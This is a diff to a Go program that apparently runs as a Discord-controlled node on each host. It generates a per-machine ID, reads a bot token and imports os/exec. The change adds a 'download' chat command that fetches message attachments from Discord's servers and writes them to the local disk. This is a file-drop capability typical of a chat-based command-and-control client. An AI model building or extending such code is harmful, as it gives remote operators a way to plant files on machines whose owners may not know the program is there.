@@ -2,11 +2,14 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"io/ioutil"
 	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"os/signal"
+	"path"
 	"runtime"
 	"strings"
 	"syscall"
@@ -24,7 +27,9 @@ func main() {
 	// Generating the node's unique ID
 	ID = generateGUID()
 
-	// Setting up the token
+	// Where to download files to
+
+	// Setting up the token (add the token manually here if you want it to be compiled with the code)
 	btok, _ := ioutil.ReadFile("token")
 	token := string(btok)
 	token = strings.Replace(token, "\n", "", -1)
@@ -111,6 +116,25 @@ func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 	}
 
+	if strings.ToLower(m.Content) == "download" {
+		if m.Attachments != nil {
+			p(m.Attachments)
+
+			for index, element := range m.Attachments {
+				// index is the index where we are
+				// element is the element from someSlice for where we are
+
+				p("atachment: " + string(index) + " " + element.ProxyURL)
+
+				filename := path.Base(element.ProxyURL)
+
+				DownloadFile(filename, element.ProxyURL)
+
+			}
+
+		}
+	}
+
 	p(m.Author.Username, ": ", m.Content)
 
 }
@@ -153,4 +177,25 @@ func generateGUID() string {
 	address = strings.ReplaceAll(address, ":", "") // removes the : so it's easier to copy and paste
 
 	return string(address)
+}
+
+func DownloadFile(filepath string, url string) error {
+
+	// Get the data
+	resp, err := http.Get(url)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	// Create the file
+	out, err := os.Create(filepath)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+
+	// Write the body to file
+	_, err = io.Copy(out, resp.Body)
+	return err
 }
